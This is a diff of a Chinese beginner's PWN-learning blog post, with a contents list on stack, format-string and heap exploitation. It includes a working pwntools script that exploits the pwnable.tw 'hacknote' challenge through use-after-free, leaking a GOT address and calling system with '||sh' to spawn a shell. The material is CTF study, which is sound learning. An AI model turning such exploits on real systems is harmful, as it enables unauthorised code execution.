href="#攻击-1"><span class="toc-text">攻击</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#x64"><span class="toc-text">x64</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#动态链接过程"><span class="toc-text">动态链接过程</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#保护措施"><span class="toc-text">保护措施</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#RELRO"><span class="toc-text">RELRO</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#The-NX-bits"><span class="toc-text">The NX bits</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#ASLR"><span class="toc-text">ASLR</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Canary"><span class="toc-text">Canary</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#PIE"><span class="toc-text">PIE</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#栈迁移"><span class="toc-text">栈迁移</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#格式化字符串漏洞"><span class="toc-text">格式化字符串漏洞</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#堆"><span class="toc-text">堆</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#什么是堆"><span class="toc-text">什么是堆</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#堆管理器"><span class="toc-text">堆管理器</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#arena"><span class="toc-text">arena</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#chunk"><span class="toc-text">chunk</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#malloced-chunk"><span class="toc-text">malloced chunk</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#free-chunk"><span class="toc-text">free chunk</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#bin"><span class="toc-text">bin</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#tcache"><span class="toc-text">tcache</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#fastbins"><span class="toc-text">fastbins</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#unsorted-bin"><span class="toc-text">unsorted bin</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#small-bins"><span class="toc-text">small bins</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#large-bins"><span class="toc-text">large bins</span></a></li></ol></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#堆漏洞"><span class="toc-text">堆漏洞</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#工具学习"><span class="toc-text">工具学习</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#pwntools"><span class="toc-text">pwntools</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#gdb"><span class="toc-text">gdb</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#IDA"><span class="toc-text">IDA</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#ROPgadget"><span class="toc-text">ROPgadget</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#one-gadget"><span class="toc-text">one_gadget</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#练习题"><span class="toc-text">练习题</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#栈溢出"><span class="toc-text">栈溢出</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#ret2text-1"><span class="toc-text">ret2text</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#ret2shellcode-1"><span class="toc-text">ret2shellcode</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#ret2syscall"><span class="toc-text">ret2syscall</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#ret2libc1"><span class="toc-text">ret2libc1</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#ret2libc2"><span class="toc-text">ret2libc2</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#retlibc3"><span class="toc-text">retlibc3</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#pwn2-x64"><span class="toc-text">pwn2_x64</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#pwn3"><span class="toc-text">pwn3</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#pwn3-x64"><span class="toc-text">pwn3_x64</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#格式化字符串"><span class="toc-text">格式化字符串</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#fmtstr1"><span class="toc-text">fmtstr1</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#fmstr2"><span class="toc-text">fmstr2</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#fmstr-uaf"><span class="toc-text">fmstr_uaf</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#堆-1"><span class="toc-text">堆</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#heap1"><span class="toc-text">heap1</span></a></li></ol></li></ol></li></ol>
     </div>
-  </header>
-
-  <div class="article-content">
-    
-      <a id="more"></a>
+  </div><div class="post-content"><a id="more"></a>
 <h1 id="PWN"><a href="#PWN" class="headerlink" title="PWN"></a>PWN</h1><p>纯零基础，大佬请略过</p>
 <p>从零开始学习PWN,Web会去学，但可能现在大部分时间会用在PWN上，如果需要题的话可以评论</p>
 <p><img src="/2020/10/24/PWN%E5%AD%A6%E4%B9%A0/1603543652982.jpeg" alt="1603543652982"></p>
@@ -464,161 +338,74 @@ ga('send', 'pageview');
 <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"> </span><br><span class="line">p = remote(<span class="string">"chall.pwnable.tw"</span>,<span class="number">10102</span>)</span><br><span class="line"><span class="comment">#p=process("./hacknote")</span></span><br><span class="line">elf = ELF(<span class="string">"./hacknote"</span>)</span><br><span class="line">libc = ELF(<span class="string">"./libc_32.so.6"</span>)</span><br><span class="line">read_got = elf.got[<span class="string">"read"</span>]</span><br><span class="line">pfputs = <span class="number">0x804862b</span></span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add_note</span><span class="params">(size,index)</span>:</span></span><br><span class="line">      p.recvuntil(<span class="string">b"choice :"</span>)</span><br><span class="line">      p.sendline(<span class="string">b"1"</span>)</span><br><span class="line">      p.recvuntil(<span class="string">b"size :"</span>)</span><br><span class="line">      p.sendline(size)</span><br><span class="line">      p.recvuntil(<span class="string">b"Content :"</span>)</span><br><span class="line">      p.sendline(index)</span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">delete_note</span><span class="params">(index)</span>:</span></span><br><span class="line">      p.recvuntil(<span class="string">b"choice :"</span>)</span><br><span class="line">      p.sendline(<span class="string">b"2"</span>)</span><br><span class="line">      p.recvuntil(<span class="string">b"Index :"</span>)</span><br><span class="line">      p.sendline(index)</span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">print_note</span><span class="params">(index)</span>:</span></span><br><span class="line">      p.recvuntil(<span class="string">b"choice :"</span>)</span><br><span class="line">      p.sendline(<span class="string">b"3"</span>)</span><br><span class="line">      p.recvuntil(<span class="string">b"Index :"</span>)</span><br><span class="line">      p.sendline(index)</span><br><span class="line"></span><br><span class="line"><span class="comment">#p.interactive()</span></span><br><span class="line">add_note(<span class="string">b"16"</span>,<span class="string">b"aaaaa"</span>)</span><br><span class="line">add_note(<span class="string">b"16"</span>,<span class="string">b"aaaaa"</span>)</span><br><span class="line">delete_note(<span class="string">b'0'</span>)</span><br><span class="line">delete_note(<span class="string">b'1'</span>)</span><br><span class="line">add_note(<span class="string">b'8'</span>,p32(pfputs)+p32(read_got))</span><br><span class="line">print_note(<span class="string">b'0'</span>)</span><br><span class="line"></span><br><span class="line">pfread = u32(p.recv()[<span class="number">0</span>:<span class="number">4</span>])</span><br><span class="line">pfsys = pfread - <span class="number">0xd41c0</span> + <span class="number">0x3a940</span></span><br><span class="line"><span class="comment">#p.interactive()</span></span><br><span class="line">delete_note(<span class="string">b'2'</span>)</span><br><span class="line"><span class="comment">#p.interactive()</span></span><br><span class="line"><span class="comment">#p.recv()</span></span><br><span class="line"><span class="comment">#p.interactive()</span></span><br><span class="line">add_note(<span class="string">b'8'</span>,p32(pfsys)+<span class="string">b"||sh"</span>)</span><br><span class="line">print_note(<span class="string">b'0'</span>)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
 <p>​       </p>
 
-    
+      </div>
+      <div class="post-copyright">
+    <p class="copyright-item">
+      <span>Author: </span>
+      <a href="https://pz1o.top">pz1o</a>
+    </p>
+    <p class="copyright-item">
+      <span>Link: </span>
+      <a href="https://pz1o.top/2020/10/24/PWN%E5%AD%A6%E4%B9%A0/">https://pz1o.top/2020/10/24/PWN%E5%AD%A6%E4%B9%A0/</a>
+    </p>
+    <p class="copyright-item">
+      <span>License: </span><a rel="license" href="http://creativecommons.org/licenses/by-nc/4.0/" target="_blank">知识共享署名-非商业性使用 4.0 国际许可协议</a>
+    </p>
   </div>
+      <footer class="post-footer">
+        <div class="post-tags">
+            <a href="/tags/PWN/">PWN</a>
+            </div>
+        
+        <nav class="post-nav"><a class="prev" href="/2020/10/27/%E9%80%86%E5%90%91%E5%B7%A5%E7%A8%8B%E6%A0%B8%E5%BF%83%E5%8E%9F%E7%90%86%E8%AF%BB%E4%B9%A6%E7%AC%94%E8%AE%B0/">
+        <i class="iconfont icon-left"></i>
+        <span class="prev-text nav-default">逆向工程核心原理读书笔记Book</span>
+        <span class="prev-text nav-mobile">Prev</span>
+      </a>
+    <a class="next" href="/2020/10/24/CUMT2020%E5%8D%8E%E4%B8%BA%E6%9D%AF/">
+        <span class="next-text nav-default">CUMT2020华为杯</span>
+        <span class="prev-text nav-mobile">Next</span>
+        <i class="iconfont icon-right"></i>
+      </a>
+    </nav></footer>
+    </article></div><div class="comments" id="comments"></div></div>
+      </main>
 
-</article>
+      <footer id="footer" class="footer"><div class="social-links"><a href="mailto:pz1olzy@aliyun.com" class="iconfont icon-email" title="email"></a>
+        <a href="https://github.com/pz1o" target="_blank" rel="noopener" class="iconfont icon-github" title="github"></a>
+        <a href="/atom.xml" class="iconfont icon-rss" title="rss"></a>
+    </div><div class="copyright">
+  <span class="power-by">
+    Powered by <a class="hexo-link" href="https://hexo.io/" target="_blank" rel="noopener">Hexo</a>
+  </span>
+  <span class="division">|</span>
+  <span class="theme-info">
+    Theme - 
+    <a class="theme-link" href="https://github.com/ahonn/hexo-theme-even" target="_blank" rel="noopener">Even</a>
+  </span>
 
-
-   
-
-   
-  <div class="box-prev-next clearfix">
-    <a class="show pull-left" href="/2020/10/24/CUMT2020%E5%8D%8E%E4%B8%BA%E6%9D%AF/">
-        <i class="icon icon-angle-left"></i>
-    </a>
-    <a class="show pull-right" href="/2020/10/27/%E9%80%86%E5%90%91%E5%B7%A5%E7%A8%8B%E6%A0%B8%E5%BF%83%E5%8E%9F%E7%90%86%E8%AF%BB%E4%B9%A6%E7%AC%94%E8%AE%B0/">
-        <i class="icon icon-angle-right"></i>
-    </a>
-  </div>
-
-
-
-
+  <span class="copyright-year">&copy;2020 - 2021<span class="heart">
+      <i class="iconfont icon-heart"></i>
+    </span>
+    <span class="author">pz1o</span>
+  </span>
 </div>
+</footer>
 
-
-  <a id="backTop" class="back-top">
-    <i class="icon-angle-up"></i>
-  </a>
-
-
-
-
-  <div class="modal" id="modal">
-  <span id="cover" class="cover hide"></span>
-  <div id="modal-dialog" class="modal-dialog hide-dialog">
-    <div class="modal-header">
-      <span id="close" class="btn-close">Close</span>
-    </div>
-    <hr>
-    <div class="modal-body">
-      <ul class="list-toolbox">
-        
-          <li class="item-toolbox">
-            <a
-              class="ROUND_RECT"
-              href="/archives/"
-              rel="noopener noreferrer"
-              target="_blank"
-              >
-              Blog
-            </a>
-          </li>
-        
-          <li class="item-toolbox">
-            <a
-              class="ROUND_RECT"
-              href="/tag/"
-              rel="noopener noreferrer"
-              target="_self"
-              >
-              Tag
-            </a>
-          </li>
-        
-          <li class="item-toolbox">
-            <a
-              class="ROUND_RECT"
-              href="/about/"
-              rel="noopener noreferrer"
-              target="_self"
-              >
-              About
-            </a>
-          </li>
-        
-      </ul>
-
-    </div>
-  </div>
-</div>
-
-
-
-  
-      <div class="fexo-comments comments-post">
-    
-
-    
-
-    
-    
-
-    
-
-    
-    
-
-    <script src="//cdn1.lncld.net/static/js/3.0.4/av-min.js"></script>
-    <script src="//cdn.jsdelivr.net/npm/valine@latest/dist/Valine.min.js"></script>
-    <div id="comment" class="vcomment" ></div>
-    <script>
-        var notify = 'true' == true ? true : false;
-        var verify = 'true' == true ? true : false;
-        var GUEST_INFO = ['nick','mail','link'];
-        var guest_info = 'nick,mail,link'.split(',').filter(function(item){
-            return GUEST_INFO.indexOf(item) > -1
-        });
-        guest_info = guest_info.length == 0 ? GUEST_INFO :guest_info;
-        window.valine = new Valine({
-            el: '.vcomment',
-            notify: notify,
-            verify: verify,
-            appId: "KLWvKGPeSIyoEo4k6j3v37wy-gzGzoHsz",
-            appKey: "FL93w3BBbF9lxiR8X1HI58En",
-            avatar:'wavatar',
-            placeholder: "Just go go",
-            guest_info:guest_info,
-            pageSize:'6'
-        });
-    </script>
-  
-    
-
-  </div>
-
-  
-
-  <script type="text/javascript">
-  function loadScript(url, callback) {
-    var script = document.createElement('script')
-    script.type = 'text/javascript';
-
-    if (script.readyState) { //IE
-      script.onreadystatechange = function() {
-        if (script.readyState == 'loaded' ||
-          script.readyState == 'complete') {
-          script.onreadystatechange = null;
-          callback();
-        }
-      };
-    } else { //Others
-      script.onload = function() {
-        callback();
-      };
-    }
-
-    script.src = url;
-    document.getElementsByTagName('head')[0].appendChild(script);
-  }
-
-  window.onload = function() {
-    loadScript('/js/bundle.js?235683', function() {
-      // load success
-    });
-  }
-</script>
-
+      <div class="back-to-top" id="back-to-top">
+        <i class="iconfont icon-up"></i>
+      </div>
+    </div><!-- SOHUCS Comments -->
+<div id="SOHUCS"></div>
+<script type="text/javascript">
+(function(){
+var appid = 'cyvuAqBH5';
+var conf = 'f4f164c77381c58d639d8e00e69da6e7';
+var width = window.innerWidth || document.documentElement.clientWidth;
+if (width < 960) {window.document.write('<script id="changyan_mobile_js" charset="utf-8" type="text/javascript" src="https://changyan.sohu.com/upload/mobile/wap-js/changyan_mobile.js?client_id=' + appid + '&conf=' + conf + '"><\/script>'); } else { var loadJs=function(d,a){var c=document.getElementsByTagName("head")[0]||document.head||document.documentElement;var b=document.createElement("script");b.setAttribute("type","text/javascript");b.setAttribute("charset","UTF-8");b.setAttribute("src",d);if(typeof a==="function"){if(window.attachEvent){b.onreadystatechange=function(){var e=b.readyState;if(e==="loaded"||e==="complete"){b.onreadystatechange=null;a()}}}else{b.onload=a}}c.appendChild(b)};loadJs("https://changyan.sohu.com/upload/changyan.js",function(){window.changyan.api.config({appid:appid,conf:conf})}); } })();
+</script><script type="text/javascript" src="/lib/jquery/jquery.min.js"></script>
+  <script type="text/javascript" src="/lib/slideout/slideout.js"></script>
+  <script type="text/javascript" src="/lib/fancybox/jquery.fancybox.pack.js"></script>
+  <script type="text/javascript" src="/js/src/even.js?v=2.11.0"></script>
 </body>
 </html>
